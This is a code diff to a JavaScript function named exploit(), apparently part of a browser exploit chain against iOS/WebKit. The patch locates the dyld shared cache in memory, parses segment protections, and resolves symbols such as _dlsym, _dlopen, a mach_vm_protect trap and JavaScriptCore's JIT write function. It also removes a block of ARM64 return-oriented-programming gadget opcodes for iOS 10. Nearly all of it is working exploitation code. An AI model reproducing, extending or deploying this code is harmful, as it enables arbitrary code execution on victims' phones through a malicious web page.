@@ -556,13 +556,16 @@ function exploit(){
        // log(hdr + hdr1)
         while(true)
         {
-            if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))
-            {
-                alert('made it')
-                break;
-            }
-            hdr = Sub(hdr, 0x1000);
+        if (memory.readInt64(hdr).lo() == 4277009104) {
+          fail('WebCore ' + hdr + ' post spectre support coming soon');
         }
+        if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))
+        {
+            break;
+        }
+        hdr = Sub(hdr, 0x1000);
+        }
+
         alert('dyld cache header @' + hdr);
         var base_seg = null;
         var nsegs    = memory.u32(Add(hdr, 0x14));
@@ -580,7 +583,8 @@ function exploit(){
                 initprot: b2u32(segdata.slice(off + 0x1c, off + 0x20))
             };
             segs.push(seg);
-            var max_rights, init_rights = ""
+            var max_rights = "";
+            var init_rights = "";
             if(seg.maxprot & VM_PROT_NONE){
                 max_rights += "-";
             }
@@ -605,10 +609,10 @@ function exploit(){
             if(seg.initprot & VM_PROT_EXECUTE){
                 init_rights += "x";
             }
-            if(max_rights.length < 3){
+            if(max_rights.length < 4){
                 max_rights = "-" + max_rights;
             }
-            if(init_rights.length < 3){
+            if(init_rights.length < 4){
                 init_rights = "-" + init_rights;
             }
             log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
@@ -632,6 +636,7 @@ function exploit(){
         }
         var libs =
         {
+            "/usr/lib/system/libdyld.dylib":                                        ["_dlsym", "_dlopen"],
             "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp", "__platform_memmove"],
             "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
             "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
@@ -643,27 +648,6 @@ function exploit(){
 
         var opcodes;
         var opcode_libs;
-
-        if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
-            //print('found iPhone OS 10')
-            opcodes = {
-                // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
-                "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
-                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
-                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
-                // blr x21; sub sp, x29, 0x20; ldp x29, x30, [sp, 0x20]; ldp x20, x19, [sp, 0x10]; ldp x22, x21, [sp], 0x30; ret
-                "altdispatch": [ 0xd63f02a0, 0xd10083bf, 0xa9427bfd, 0xa9414ff4, 0xa8c357f6, 0xd65f03c0 ],
-                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
-                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
-                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
-                // sub sp, x29, 0x50; ldp x29, x30, [sp, 0x50]; ldp x20, x19, [sp, 0x40]; ldp x22, x21, [sp, 0x30];
-                // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret
-                "altstackloader": [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ],
-            };
-
-            opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
-        } else {
-            //print('found iPhone OS != 10')
             libs["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push(
                 "__ZN3JSC29jitWriteSeparateHeapsFunctionE"
             )
@@ -701,7 +685,8 @@ function exploit(){
             {
                 return memory.read(Add(straddr, i), 1)[0];
             };
-            var base = Add(memory.read(Add(imgs, i * 0x20),8), cache_slide);
+            var base = Add(memory.read_i64(Add(imgs, i * 0x20),0), cache_slide);
+            alert("base" + base);
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
                 var ncmds = memory.u32(Add(base, 0x10));
